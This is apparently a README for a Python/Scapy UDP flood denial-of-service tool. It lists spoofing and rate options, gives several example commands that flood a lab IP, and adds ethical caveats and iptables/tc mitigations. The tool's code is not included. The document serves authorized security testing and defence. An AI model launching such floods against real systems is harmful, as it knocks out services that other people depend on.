# UDP Flood Attack Simulation

## Overview

The UDP Flood attack is a type of Denial of Service (DoS) attack that exploits the stateless nature of the UDP protocol. By flooding a target system with a large volume of UDP packets, the attacker can overwhelm the target's resources, consume bandwidth, and potentially render services unavailable.

Unlike TCP-based attacks, UDP floods don't require a connection handshake, making them easier to execute and harder to filter. The target system must process each incoming UDP packet, check for listening services on the destination port, and often send ICMP "Destination Unreachable" responses, all of which consume CPU cycles and bandwidth.

## Features

- **Flexible Port Targeting**: Target specific ports, port ranges, or random ports
- **IP Spoofing**: Option to randomize source IP addresses for each packet
- **Customizable Payload**: Configure payload size from 0 to 65,507 bytes
- **Rate Control**: Precisely control packet transmission rate (packets per second)
- **Performance Metrics**: Real-time statistics on packet rate, bandwidth consumption
- **Progress Tracking**: Visual progress indicators during attack execution
- **Comprehensive Logging**: Detailed logging with configurable verbosity levels

## Requirements

- Python 3.7 or higher
- Scapy library (2.4.5 or higher)
- Root/Administrator privileges (required for raw packet manipulation)
- Network interface with appropriate permissions

## Installation

### Install Dependencies

```bash
pip install -r requirements.txt
```

### Verify Installation

```bash
python3 udp_flood.py --help
```

## Usage

### Basic Usage

```bash
# Target port 53 (DNS) with default settings
sudo python3 udp_flood.py -t 192.168.1.10 -p 53

# Target multiple specific ports
sudo python3 udp_flood.py -t 192.168.1.10 -p 53,123,161
```

### Advanced Usage

```bash
# High-intensity attack with large payload
sudo python3 udp_flood.py -t 192.168.1.10 -p 53 -c 10000 -r 1000 --payload-size 1024

# Target port range
sudo python3 udp_flood.py -t 192.168.1.10 -p 1000-2000 -c 5000

# Random port flooding
sudo python3 udp_flood.py -t 192.168.1.10 --random-ports -c 5000 -r 500

# Disable IP spoofing (use fixed source IP)
sudo python3 udp_flood.py -t 192.168.1.10 -p 80 --no-spoof

# Verbose output for debugging
sudo python3 udp_flood.py -t 192.168.1.10 -p 53 -v
```

## Monitoring the Attack

### Monitor Network Traffic

On the attacking machine:
```bash
# Monitor outgoing UDP traffic
sudo tcpdump -i any 'udp and dst host 192.168.1.10' -c 100
```

On the target machine:
```bash
# Monitor incoming UDP traffic
sudo tcpdump -i any 'udp' -c 100

# Monitor system resources
top
htop
```

### Check Attack Statistics

The tool provides real-time statistics including:
- **Packets Sent**: Total number of UDP packets transmitted
- **Duration**: Total attack duration
- **Actual Rate**: Achieved packet transmission rate
- **Rate Efficiency**: Percentage of configured rate achieved
- **Estimated Traffic**: Total bandwidth consumed

## Ethical Considerations

### Legal Requirements

- **Authorization Required**: Only use this tool on networks and systems you own or have explicit written permission to test
- **Compliance**: Ensure compliance with local, national, and international laws
- **Professional Use**: Intended for security professionals, penetration testers, and researchers
- **Educational Purpose**: Use in controlled lab environments for educational purposes

### Safety Guidelines

1. **Never** use this tool against production systems without proper authorization
2. **Always** obtain written permission before conducting security tests
3. **Inform** relevant stakeholders about planned security testing
4. **Document** all testing activities for audit purposes
5. **Restore** any affected systems to normal operation after testing

### Potential Consequences

Unauthorized use of this tool may result in:
- Criminal prosecution under computer fraud and abuse laws
- Civil liability for damages
- Loss of professional certifications
- Termination of employment
- Damage to professional reputation

## Defensive Measures

### Detection

- **Anomaly Detection**: Monitor for unusual spikes in UDP traffic
- **Rate Limiting**: Track packet rates per source IP
- **Port Monitoring**: Watch for scanning patterns across multiple ports
- **ICMP Monitoring**: Excessive ICMP "Destination Unreachable" messages

### Mitigation

```bash
# Using iptables to rate-limit UDP traffic
sudo iptables -A INPUT -p udp -m limit --limit 50/s --limit-burst 100 -j ACCEPT
sudo iptables -A INPUT -p udp -j DROP

# Block UDP floods from specific source
sudo iptables -A INPUT -p udp -s 10.0.0.1 -j DROP

# Limit UDP packet rate with tc (traffic control)
sudo tc qdisc add dev eth0 root tbf rate 1mbit burst 32kbit latency 400ms
```

### Prevention Strategies

1. **Firewall Configuration**: Implement strict UDP filtering rules
2. **Rate Limiting**: Apply rate limits on UDP traffic
3. **Ingress Filtering**: Prevent IP spoofing at network edge (BCP 38/RFC 2827)
4. **DDoS Protection Services**: Use cloud-based DDoS mitigation services
5. **Network Segmentation**: Isolate critical services
6. **Monitoring Systems**: Deploy IDS/IPS solutions

## Command Line Options

```
Required Arguments:
  -t, --target TARGET       IP address of the target system

Port Configuration (choose one):
  -p, --ports PORTS         Target ports (comma-separated or range, e.g., '53,123' or '1000-2000')
  --random-ports            Use random destination ports

Optional Arguments:
  -c, --count COUNT         Number of packets to send (default: 1000)
  -r, --rate RATE          Packets per second (default: 100)
  --payload-size SIZE       Payload size in bytes (default: 512, max: 65507)
  -s, --spoof              Use random source IPs (default: True)
  --no-spoof               Disable IP spoofing
  -v, --verbose            Enable verbose output
  -h, --help               Show help message
```

## Technical Details

### UDP Packet Structure

```
+------------------+
| IP Header (20B)  |
+------------------+
| UDP Header (8B)  |
+------------------+
| Payload (0-65507)|
+------------------+
```

### Attack Mechanism

1. **Packet Generation**: Create UDP packets with randomized or specified parameters
2. **IP Spoofing** (optional): Randomize source IP addresses
3. **Transmission**: Send packets at specified rate
4. **Resource Consumption**: Target processes packets, consuming CPU and bandwidth

### Performance Considerations

- **Rate Limiting**: Higher packet rates require more CPU on attacking machine
- **Payload Size**: Larger payloads consume more bandwidth but fewer packets/sec
- **IP Spoofing**: Adds computational overhead per packet
- **Network Capacity**: Actual rate limited by network bandwidth

## Troubleshooting

### Permission Denied

```bash
# Solution: Run with sudo/administrator privileges
sudo python3 udp_flood.py -t 192.168.1.10 -p 53
```

### Module Not Found Error

```bash
# Solution: Install required dependencies
pip install -r requirements.txt
```

### Low Packet Rate

- Check CPU usage (high CPU may limit rate)
- Reduce payload size
- Disable verbose logging
- Check network bandwidth limits

## License

Proprietary - Montimage

## Disclaimer

This tool is provided for educational and authorized security testing purposes only. The authors and contributors assume no liability for misuse or damage caused by this program. Users are solely responsible for ensuring compliance with applicable laws and regulations.

**USE AT YOUR OWN RISK**
